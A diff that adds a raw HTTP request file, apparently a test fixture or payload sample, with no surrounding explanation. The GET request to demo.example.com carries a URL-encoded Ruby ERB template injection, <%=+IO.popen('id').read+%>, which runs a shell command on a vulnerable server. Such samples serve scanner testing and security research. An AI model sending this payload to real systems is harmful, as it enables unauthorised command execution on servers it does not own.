@@ -1,0 +1,4 @@
+GET /a?page=%3C%25%3D%2BIO.popen%28%27id%27%29.read%2B%25%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
